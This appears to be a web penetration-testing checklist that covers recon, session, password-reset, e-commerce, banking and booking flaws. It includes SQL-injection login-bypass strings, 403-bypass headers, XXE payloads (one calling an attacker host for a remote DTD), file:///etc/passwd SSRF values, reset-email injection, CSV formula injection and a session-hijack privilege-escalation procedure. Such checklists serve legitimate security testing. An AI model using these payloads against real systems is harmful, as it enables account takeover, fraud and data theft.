checklist.activity: Bruteforce sub domains

assetfinder -subs-only http://tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"
checklist.remarks: Check for the third level domains

checklist.activity: Directory enumeration
tools_technique: Dirbuster or Dirb with latest wordlist
checklist.remarks: Find admin panel based on CMS or bruteforcing

checklist.activity: Identify the underlying web client and server technology
Uncover HTTP services running on ports other than 80 and 443
Leaked info
Find sensitive information through keywords after crawling entire website. Keywords such as: Password, admin, http, todo
checklist.remarks: a. Search for http:// to find insecure endpoints. b. Search for keywords like admin, todo etc. c. Search for both http:// & https:// to find hidden endpoints in js files

checklist.activity: Test for ping
Use Censys
checklist.remarks: Give domain name and find exposed devices, services, mail exchange servers and much more

checklist.activity: DNS testing - Zone transfer, Missing Certification Authority Authorization (CAA) Record, Missing DNSSEC
checklist.remarks: Perform local WHOIS search instead of global WHOIS domain to find more information

checklist.activity: Nessus scan
Banner disclosure of services other than 80 and 443
Find all web servers using Nmap
UDP proto scanner
Application Mapping - Generate site structure
Identify known vulnerabilities in the web/app server
SSL/TLS certificate testing
Identify actual session cookie out of bulk cookies in the application
Decode cookies using some standard decoding algorithms such as Base64, hex, URL etc.
Modify cookie/session token value by 1 bit/byte. Then resubmit and do the same for all tokens. Identify which part of token is actually being used and which is not.

If self-registration is available and you can choose your username, log in with a series of similar usernames containing small variations (e.g. A, AA, AAA, AAAA, AAAB, AAAC, AABA) and check user-specific data submitted at login or stored in user profiles
Token leakage via Referer header - Untrusted 3rd Party
Check for session cookies and cookie expiration date/time
Identify cookie domain scope
Check for HttpOnly flag in cookie
Check for Secure flag in cookie if the application is over SSL
Check for session fixation i.e. value of session cookie before and after authentication
Password reset link token does not expire (Insecure Configurability)
checklist.remarks: 1. Create your account on target. 2. Request a forget password link. 3. Don't use that link. 4. Instead log in with your old password and change your email to another. 5. Now use that password link sent to old email and check if you are able to change your password.

checklist.activity: Replay the session cookie from a different effective IP address or system to check whether server maintains the state of the machine or not
Old session does not expire
checklist.remarks: 1. Create your account. 2. Open two browsers (e.g. Chrome and Firefox). 3. Login in one browser. 4. In other browser login then change or reset your password. 5. After successfully changed/reset go to other browser and refresh the page — if still logged in, it is vulnerable.

checklist.activity: Check for concurrent login through different machine/IP
Check if any user pertaining information is stored in cookie value or not. If yes, tamper it with other user's data.
Check for duplicate registration / Overwrite existing user
Check for weak password policy
Check for stored values in username, account name for registration
Check for insufficient email verification process
Weak registration implementation - Allows disposable email addresses

Overwrite default web application pages by specially crafted username registrations. If profile link appears as www.chintan.com/username, enumerate default folders (/images, /contact, /portfolio) and register using those as usernames. Check if default folders have been overwritten.
Username enumeration

Bypass authentication using various SQL Injections on username and password field. Use combinations: chintan' --, chintan' #, chintan'/*, ' or 1=1 --, ' or 1=1 #, ' or 1=1/*, ') or '1'='1 --, ') or ('1'='1 --
Auto-complete testing
Lack of password confirmation on: Change email address, Change password, Manage 2FA. CHECK 2FA Cheatsheet from the Resource Section.
Is it possible to use resources without authentication? Access violation.
Check if user credentials are transmitted over SSL or not
Weak login function - HTTP and HTTPS both are available

Test user account lockout mechanism on bruteforce attack. Variation: If server blocks instant user requests, try with time throttle option from intruder. A. Bypass rate limiting by tampering user agent to Mobile User agent. B. Bypass rate limiting by tampering user agent to Anonymous user agent.
tools_technique: Burpsuite intruder with time throttle option

checklist.activity: Create a password wordlist using cewl command: cewl -m 12,20 -w ~/Desktop/chintan.txt chintan.com. Use the wordlist with the Transmute python file to create complex wordlist for the bruteforce process.
checklist.remarks: Reference: https://www.hackingarticles.in/comprehensive-guide-on-cewl-tool/

checklist.activity: OTP Bypass response manipulation (Register or login or password reset). Steps: 1. Register 2 accounts. 2. Intercept request. 3. Intercept response to this request. 4. Check message status (e.g. status:1). 5. With other account enter wrong OTP. 6. Intercept response. 7. See status:0. 8. Change status to 1 and forward the request.

403 Bypass techniques: X-Original-URL header injection, URL encoding (%2e), path variations (/admin/monitor/;panel), X-Custom-IP-Authorization: 127.0.0.1, Host header to google.com, path variations (example.com/admin/., //admin//, /./admin/./), subdomain redirect bypass
checklist.remarks: GET /admin HTTP/1.1 -> 403 Forbidden. GET /anything HTTP/1.1 with X-Original-URL: /admin -> 200 OK. https://web.com/%2e/path -> 200 OK. /admin/monitor/;panel -> 200 OK. X-Custom-IP-Authorization: 127.0.0.1 -> 302 Found/200 OK

checklist.activity: Test OAuth login functionality for Open Redirection. 1. Use Burp 'find' option to find parameters such as url, red, redirect, redir, origin, dest, targetURL, checkout_URL. 2. Check the value of these parameters which may contain a URL. 3. Check open redirection for OAuth functionality. 4. Change the URL value to www.chintan.com and check if it gets redirected. 5. Check if same secret code request can be used multiple times.
Generate custom pages such as /chintan.php, chintan.aspx and identify error page
Add multiple parameters in same POST/GET request using different values and generate error
Add [], ]], and [[ in cookie values and parameter values to create errors
Try to generate unusual error code by giving input as /~chintan/%s at the end of website URL

checklist.category: Post Login Account Information Testing / Testing My Account Information

checklist.category: Post Login Account Information Testing / Testing My Account Information
checklist.activity: Create a list of features that are pertaining to a user account only (Change Email, Change Password, Change account details - Name, Number, Address, etc.) and Try CSRF

checklist.category: Post Login Account Information Testing / Testing My Account Information
checklist.activity: Post login change email id and update with any existing email id. Check if it is getting validated on server side or not. Does the application send any new email confirmation link to a new user? What if a user does not confirm the link in some time frame?

checklist.category: Post Login Account Information Testing / Testing My Account Information
checklist.activity: Perform all file upload tests using extension tampering and file content modifying. Unsafe File upload: No Antivirus, No Size Limit, File extension Filter Bypass. Bypass file upload restrictions: Add ' , . " after the file extension (e.g. file.php', file.php., file.php")

checklist.category: Post Login Account Information Testing / Testing My Account Information
checklist.activity: Open profile picture in new tab and check the URL. Find email id/user id info. EXIF Geolocation Data Not Stripped From Uploaded Images.

checklist.category: Post Login Account Information Testing / Testing My Account Information
checklist.activity: Check account deletion option if application provides it and confirm that via forgot password feature

checklist.category: Post Login Account Information Testing / Testing My Account Information
checklist.activity: Change email id, account id, user id parameter and try to bruteforce other user's password

checklist.category: Post Login Account Information Testing / Testing My Account Information
checklist.activity: Check whether application re-authenticates for performing sensitive operation for post authentication features

checklist.category: Post Login Account Information Testing / Testing My Account Information
checklist.activity: Privilege escalation. Steps: Sign in as attacker, go to active sessions settings tab and revoke all sessions besides current. Sign in as admin in other browser. Go to users admin section and impersonate attacker. Update active sessions tab as attacker. Inspect Revoke button and copy session ID. Clear attacker browser cookie. Set _gitlab_session to the copied session ID via developer console. Refresh page to be inside impersonated session. Click Stop impersonating to become admin.

checklist.category: Post Login Account Information Testing / Testing My Account Information
checklist.activity: Failure to invalidate session on Logout and Password reset
Check if forget password reset link/code uniqueness
Check if reset link does get expire or not if it is not used by the user for certain amount of time
Find user account identification parameter and tamper Id or parameter value to change other user's password
Check for weak password policy
Weak password reset implementation - Token is not invalidated after use
If reset link has another params such as date and time, change date and time value in order to make an active and valid reset link.
checklist.remarks: Old link becomes valid if date and time parameter values are changed to fresh ones. Date/time link is not user dependent and therefore valid across all users.

checklist.activity: Check if security questions are asked. How many guesses allowed? Lockout policy maintained or not?
Add only spaces in new password and confirmed password. Then hit enter and see the result.
Does it display old password on the same page after completion of forget password formality?
No domain email - email=victim
No TLD email - email=victim@xyz
JSON table - {"email":["victim@chintan.com","hacker@chintan.com"]}
email=victim@chintan.com, hacker@chintan.com
email=victim@chintan.com%20hacker@chintan.com
email=victim@chintan.com|hacker@chintan.com
Carbon Copy - email=victim@chintan.com%0a%0dcc:hacker@chintan.com
Double Parameter - email=victim@chintan.com&email=hacker@chintan.com
Ask for two password reset links and use the older one from user's email
Check if active session gets destroyed upon changing the password or not
checklist.remarks: Proof of Concept: Changing the password in some applications doesn't destroy other sessions. As other sessions are not destroyed, attacker will still be logged in even after password change. PATCH: When someone changes their password, every active session belonging to that particular account must be destroyed.

checklist.activity: Weak password reset implementation - Password reset token sent over HTTP
Send continuous forget password requests so that it may send sequential tokens
Is CAPTCHA implemented on contact us form in order to restrict email flooding attacks?
Does it allow to upload file on the server?
A. Buy Now: Tamper product ID to purchase other high valued product with low price. Tamper product data in order to increase the number of product with the same price.

B. Gift / Voucher: Tamper gift/voucher count in the request. Tamper gift/voucher value to increase/decrease the money value. Reuse gift/voucher by using old gift values. Check the uniqueness of gift/voucher parameter and try guessing other gift/voucher codes. Use parameter pollution technique to add same voucher twice.

C. Add/Delete Product from Cart: Tamper user id to delete products from other user's cart. Tamper cart id to add/delete products from other user's cart. Identify cart id/user id for cart feature to view added items from other user's account.

D. Address: Tamper BurpSuite request to change other user's shipping address to yours. Try stored-XSS by adding XSS vector on shipping address. Use parameter pollution technique to add two shipping addresses instead of one.

E. Place Order: Tamper payment options parameter to change the payment method. Tamper the amount value for payment manipulation. Check if CVV is going in cleartext. Check if credit/debit card details are masked. Check if application itself processes card details or calls third party payment processing company.
F. Track Order: Track other user's order by guessing order tracking number

checklist.category: Flight / Railway / Hotel / Cab etc. Booking Testing
checklist.activity: A. Booking details: View/Manage other user's booking details. Check reservation status for other users/behalf of other users.

checklist.category: Flight / Railway / Hotel / Cab etc. Booking Testing
checklist.activity: B. Ticket/Vouchers: View other users vouchers/e-tickets from PRINT option. Check if sensitive data is passed in GET request. If e-ticket/voucher is sent on email, check for the email flooding attack.

checklist.category: Flight / Railway / Hotel / Cab etc. Booking Testing
checklist.activity: C. Refund: View other user's refund status. Refund more money than the intended one by parameter manipulation. If refund tracking is allowed, gain other user's refund tracking status.

checklist.category: Flight / Railway / Hotel / Cab etc. Booking Testing
checklist.activity: D. Cancellation: Gain higher cancellation amount with parameter modifying for amount value.

checklist.category: Flight / Railway / Hotel / Cab etc. Booking Testing
checklist.activity: E. Booking: Do 1st person booking and add 3 other persons in same price. Hotel - Book normal room - Select Deluxe room in the same price.

Use SQLmap to identify vulnerable parameters. Steps: 1. Fill form in browser GUI and submit normally. 2. Go to history tab in Burpsuite and find the relevant request. 3. Right click and select 'copy to file'. 4. Save file as anyname.txt. 5. Run: python sqlmap.py -r ~/Desktop/textsqli.txt --proxy="http://127.0.0.1:8080"

Database Management System (DBMS) Misconfiguration - Excessively Privileged User / DBA

Bypass filter using returnTo=///chintan.com/
Host header attack: Insert new header X-Forwarded-Host: www.chintan.com in the GET/POST request. Change the Host header to google.com and see if it gets redirected.

SAP Application Testing - SAP Netweaver Application: 1. From the default error page derive the hostname and system information. 2. Do an NMAP scan and check for WebDAV methods on other ports than 80 & 443.

checklist.activity: ASP.NET website testing - Check if ASP.net viewstate parameter is encrypted or not
Re-use Anti-CSRF token for CSRF attack
Check if token is validated on server side or not
Check if token validation is for full length or partial length
Create few dummy accounts and compare the CSRF token for all those accounts
Bypass CSRF token using 2 input type fields for updating user's information in the same HTML file
Convert POST request to GET and remove _csrf (anti-csrf token) to bypass the CSRF protection
Check if the value you are trying to change is passed in multiple parameters such as cookie, http headers along with GET and POST request

XML Injection Testing (XXE). Insert code to retrieve /etc/passwd contents. Change content type to text/xml then insert payload: <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE chintan [<!ELEMENT chintan ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><chintan>&xxe;</chintan>
checklist.remarks: Instance 2 - XXE in VisualRF Backup Sites (CVE-2016-8526): POST /visualrf/backup_sites with xml=<?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE x [<!ENTITY %25 foo SYSTEM "http://<AttackerHost>:1234/sectest.dtd">%25%66%6f%6f%3b%25%70%61%72%61%6d%31%3b]>

checklist.activity: OTP testing: 1. Check for OTP bypass. 2. Check for OTP reuse. 3. Check for increasing OTP validity via parameter tampering.

Billing Activity Testing: 1. Check if user A can view account statement for user B. 2. Check if user A can view transaction report for user B. 3. Check if user A can view summary report for user B. 4. Check if user A can register for monthly/weekly account statement via email on behalf of user B. 5. Check if user A can update existing email id of user B to retrieve monthly/weekly account summary.
Deposit/Loan/Linked/External Account Checking: 1. Check if user A can view deposit account summary of user B. 2. Check for account balance tampering for Deposit accounts.

Tax Deduction Inquiry Testing: 1. Check if user A with customer id 'a' can see tax deduction details of user B by tampering customer id 'b'. 2. Check parameter tampering for increasing and decreasing interest rate, interest amount, and tax refund. 3. Check if user A can download the TDS details of user B.
Check if user A can request for the cheque book on behalf of user B
Fixed Deposit Account Testing: 1. Check if it is possible for user A to open FD account on behalf of user B. 2. Check if user can open FD account with more amount than the current account balance.
Stopping Payment on basis of cheque/date range: 1. Can user A stop the payment of user B via cheque number. 2. Can user A stop the payment on basis of date range for user B.
Status Enquiry Testing: 1. Can user A view the status enquiry of user B. 2. Can user A modify the status enquiry of user B. 3. Can user A post an enquiry on behalf of user B from his own account.

Fund transfer testing: 1. Is it possible to transfer funds to user C instead of user B from user A. 2. Can fund transfer amount be manipulated. 3. Can user A modify the payee list of user B by parameter manipulation. 4. Is it possible to add payee without any proper validation.
Schedule transfer testing: 1. Can user A view the schedule transfer of user B. 2. Can user A change the details of schedule transfer for user B.
Testing of fund transfer via NEFT: 1. Amount manipulation via NEFT transfer. 2. Check if user A can view the NEFT transfer details of user B.

Testing for Bill Payment: 1. Check if user can register payee without any checker approval. 2. Check if user A can view the pending payments of user B. 3. Check if user A can view the payment made details of user B.
SOAP message tampering: 1. Bruteforcing using *. 2. Bruteforcing using user credentials. 3. Parameter guessing.
Convert GET to POST and POST to GET methods
SQL Injection: ' " - * )
Directory traversal: ../../../../../autoexec.bat
XML Poisoning
Enumeration and profiling: 1. <service> - Web service. 2. <operation> - Web methods. 3. <element> - Data types. 4. <endpoint> - Web service address.
Automated Scanners - Use automated scanners one by one against the application
Replay attack: 1. Send old captcha value - if accepts then it is vulnerable. 2. Send old captcha value with old session ID - if it accepts then it is vulnerable.
Check if captcha is retrievable with the absolute path such as www.chintan.com/internal/captcha/images/24.png
checklist.remarks: If so, attacker can download all images and know their individual values, then write a small program to bruteforce it.

checklist.activity: Check for the server side validation for CAPTCHA: Remove captcha block from GUI using firebug addon and submit request to the server.
Check if image recognition can be done with OCR tool. a. If OCR identifies then report as weak strength of captcha. b. If no, then secure.
Check for SSRF Vulnerability by giving www.chintan.com:22, www.chintan.com:23 etc. Check for the response page and determine if the port is opened.
Check for: Clickjacking on Sensitive Action, X-XSS header, HSTS header, CSP header, Referrer-Policy, Cache Control, Public key pins, X-Webkit-CSP

Command injection through CSV export: 1. Export the list of registered users or group members. 2. Write =2*10 in first name, last name etc. 3. Export the CSV and check if command executed successfully. 4. If result shows 20 in first name, you can spread malware through CSV.
checklist.remarks: An attacker can inject commands (e.g. =2*10) in fields, and when exported to CSV it evaluates to 20, enabling malware spread and system level commands on victim's machine if victim downloads the CSV.

checklist.activity: DDOS using xmlrpc.php
checklist.remarks: Wordpress blogs with xmlrpc.php enabled for pingbacks/trackbacks can be used as part of a botnet for DDOS. To check if xmlrpc.php is enabled, send: POST /xmlrpc.php HTTP/1.1 with methodCall demo.sayHello.

Testing for Role authorization: 1. Check if normal user can access the resources of high privileged users. 2. Forced browsing. 3. Insecure direct object reference. 4. Parameter tampering to switch user account to high privileged user.
No rate limiting on form: Registration, Login, Email triggering, SMS triggering

Test for OTP: 1. Try injection to bypass OTP verification. 2. Check for guessable OTP codes. 3. Check for the response in order to bypass OTP. 4. Give ' in OTP and check if you can bypass it. Additional Scenario: While signing up, the OTP is sent to the mobile number - intercept the request and edit the mobile number with an already registered number to login as another user.

SSRF/LFI: Search for URL or Download parameter. Try file:///etc/passwd. url=file:///etc/passwd. download=file:///etc/passwd.
